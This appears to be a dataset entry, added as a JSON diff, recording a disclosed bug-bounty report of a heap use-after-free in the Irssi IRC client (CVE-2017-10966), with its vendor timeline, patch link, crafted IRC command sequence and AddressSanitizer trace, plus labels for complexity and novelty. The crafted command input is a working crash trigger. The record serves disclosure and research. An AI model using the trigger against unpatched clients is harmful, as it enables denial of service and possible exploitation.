@@ -1,0 +1,38 @@
+{
+  "reported_to": "Internet Bug Bounty",
+  "reported_by": "geeknik ",
+  "title": "CVE-2017-10966: Heap-use-after-free in Irssi <1.0.4",
+  "content": "\n35 days after reading https://irssi.org/2017/05/12/fuzzing-irssi/, I was able to trigger a heap-use-after-free in irssi 1.0.2.\nTimeline:\nReport to vendor: 16 June 2017\nAcknowledge by vendor: 16 June 2017\nFixed by vendor: 7 July 2017\nAdvisory:\nhttp://seclists.org/oss-sec/2017/q3/80\nPatch:\nhttps://github.com/irssi/irssi/commit/5e26325317c72a04c1610ad952974e206\nCode 2.81 KiB\n1./irssi < test001\n2CAP LS\n3NICK root\n4USER root root /dev/stdin :root\n5MODE  +i\n6WHOIS root\n7WHO +00000000000000000000o00\n8\n9==30112==ERROR: AddressSanitizer: heap-use-after-free on address 0x607000008100 at pc 0x0000006d3a48 bp 0x7ffdd447b320 sp 0x7ffdd447b318\n10READ of size 8 at 0x607000008100 thread T0\n11    #0 0x6d3a47 in nicklist_remove_hash /root/irssi-1.0.2/src/core/nicklist.c:455:30\n12    #1 0x7f97420273bf in g_hash_table_foreach (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x393bf)\n13    #2 0x6d3786 in sig_channel_destroyed /root/irssi-1.0.2/src/core/nicklist.c:465:2\n14    #3 0x6f499b in signal_emit_real /root/irssi-1.0.2/src/core/signals.c:242:3\n15    #4 0x6f4207 in signal_emit /root/irssi-1.0.2/src/core/signals.c:286:3\n16    #5 0x699ec1 in channel_destroy /root/irssi-1.0.2/src/core/channels.c:83:2\n17    #6 0x672ce0 in event_join /root/irssi-1.0.2/src/irc/core/channel-events.c:258:3\n18    #7 0x6f499b in signal_emit_real /root/irssi-1.0.2/src/core/signals.c:242:3\n19    #8 0x6f4207 in signal_emit /root/irssi-1.0.2/src/core/signals.c:286:3\n20    #9 0x62cd3d in irc_server_event /root/irssi-1.0.2/src/irc/core/irc.c:308:7\n21    #10 0x6f499b in signal_emit_real /root/irssi-1.0.2/src/core/signals.c:242:3\n22    #11 0x6f59b6 in signal_emit_id /root/irssi-1.0.2/src/core/signals.c:304:3\n23    #12 0x62d33a in irc_parse_incoming_line /root/irssi-1.0.2/src/irc/core/irc.c:362:3\n24    #13 0x6f499b in signal_emit_real /root/irssi-1.0.2/src/core/signals.c:242:3\n25    #14 0x6f59b6 in signal_emit_id /root/irssi-1.0.2/src/core/signals.c:304:3\n26    #15 0x62d6ba in irc_parse_incoming /root/irssi-1.0.2/src/irc/core/irc.c:383:3\n27    #16 0x6bb9b2 in irssi_io_invoke /root/irssi-1.0.2/src/core/misc.c:55:3\n28    #17 0x7f9742038229 in g_main_context_dispatch (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x4a229)\n29    #18 0x7f97420385df  (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x4a5df)\n30    #19 0x7f974203868b in g_main_context_iteration (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x4a68b)\n31    #20 0x57e4a7 in main /root/irssi-1.0.2/src/fe-text/irssi.c:326:3\n32    #21 0x7f97408273f0 in __libc_start_main /build/glibc-cxyGtm/glibc-2.24/csu/../csu/libc-start.c:291\n33    #22 0x42e979 in _start (/root/irssi-1.0.2/src/fe-text/irssi+0x42e979)\n34\n350x607000008100 is located 64 bytes inside of 72-byte region [0x6070000080c0,0x607000008108)\n36freed by thread T0 here:\n37    #0 0x4e4170 in __interceptor_cfree.localalias.1 (/root/irssi-1.0.2/src/fe-text/irssi+0x4e4170)\n38    #1 0x6d39eb in nicklist_destroy /root/irssi-1.0.2/src/core/nicklist.c:112:2\n39    #2 0x6d39eb in nicklist_remove_hash /root/irssi-1.0.2/src/core/nicklist.c:456\n40\n41previously allocated by thread T0 here:\n42    #0 0x4e4520 in calloc (/root/irssi-1.0.2/src/fe-text/irssi+0x4e4520)\n43    #1 0x7f974203d9e0 in g_malloc0 (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x4f9e0)\n44\n45SUMMARY: AddressSanitizer: heap-use-after-free /root/irssi-1.0.2/src/core/nicklist.c:455:30 in nicklist_remove_hash\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Use After Free"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1571026260,
+  "report_url": "https://hackerone.com/reports/247028",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "LOW",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Run irssi with the test input file: ./irssi < test001"
+    ],
+    [
+      2,
+      "Observe the heap-use-after-free error triggered by the WHO command with a specific pattern"
+    ]
+  ],
+  "vuln_description": "A heap-use-after-free vulnerability in Irssi version 1.0.2 occurs when processing a specially crafted WHO command. The vulnerability is triggered during the channel destruction process, where a freed memory region is accessed during nicklist cleanup.",
+  "reason": "The vulnerability requires understanding of IRSSI's internal nicklist management and channel destruction sequence, but the actual trigger is straightforward once the memory management pattern is understood. The attack involves sending a specific IRC command sequence, but doesn't require maintaining complex application state or understanding subtle component interactions.",
+  "new_complexity": "MEDIUM",
+  "requires_code": true,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null
+}
